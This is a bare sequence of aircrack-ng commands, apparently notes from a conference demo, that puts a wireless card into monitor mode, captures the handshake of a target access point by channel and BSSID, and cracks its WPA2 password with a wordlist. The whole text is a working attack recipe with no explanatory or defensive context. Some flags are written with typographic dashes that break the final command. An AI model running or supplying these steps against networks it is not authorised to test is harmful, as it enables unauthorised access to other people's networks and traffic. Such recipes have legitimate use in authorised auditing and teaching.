airmon-ng
airmon-ng start wlan0
airodump-ng mon0
airodump-ng -c <CONNECTION_CHANNEL> --bssid <MAC_ADDR> ~/defcon
aircrack-ng –a2 –b <MAC_ADDR> –w /root/wordlist.txt  ~/defcon*.cap


